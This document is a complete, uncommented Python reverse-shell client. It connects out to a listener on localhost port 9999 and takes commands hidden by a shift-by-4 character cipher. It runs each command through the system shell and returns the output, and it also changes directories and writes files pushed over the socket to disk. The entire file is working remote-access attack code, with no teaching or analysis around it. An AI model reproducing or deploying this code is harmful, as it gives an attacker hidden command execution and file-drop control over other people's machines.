import socket
import os
import subprocess
import select
import time
import ctypes

s=socket.socket()

def frecv(sck):

    fname=sck.recv(1024)

    sck.send(b'OK')

    fname=fname.decode()

    fsize=sck.recv(1024)

    sck.send(b'OK')

    fhandle=open(fname,'wb')

    fhandle.write(sck.recv(int(fsize.decode())))

    sck.send(b'OK')

    fhandle.close()

def dec(txt):

	i=0

	newbuf=''

	char=''

	dec=0

	for i in range(len(txt)):

		dec=ord(txt[i])

		char=chr(dec-4)

		newbuf+=char

	return newbuf

def enc(txt):

	i=0

	newbuf=''

	char=''

	dec=0

	for i in range(len(txt)):

		dec=ord(txt[i])

		char=chr(dec+4)

		newbuf+=char

	return newbuf

def reverseconn():

    host=socket.gethostbyname("localhost") 

    port=9999

    global s

    s.connect((host,port))

    while True:

        recvcmd=s.recv(2**24)

        if dec(recvcmd[:2].decode("utf-8"))=="cd":

            os.chdir(dec(recvcmd[3:].decode("utf-8")))

            s.send(str.encode(enc(str(os.getcwd())+'> ')))

        elif dec(recvcmd.decode("utf-8"))=="quit":

            break

        elif dec(recvcmd[:6].decode("utf-8"))=="ftrans":

            frecv(s)

        elif len(recvcmd)>0 and dec(recvcmd[:2].decode("utf-8"))!="cd":

            cmd = subprocess.Popen(dec(recvcmd[:].decode("utf-8")), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

            obyte=cmd.stdout.read()+cmd.stderr.read()

            ostr=str(obyte, "utf-8")

            s.send(str.encode(enc(ostr+str(os.getcwd())+'> ')))

    s.close()

reverseconn()

    

    


        
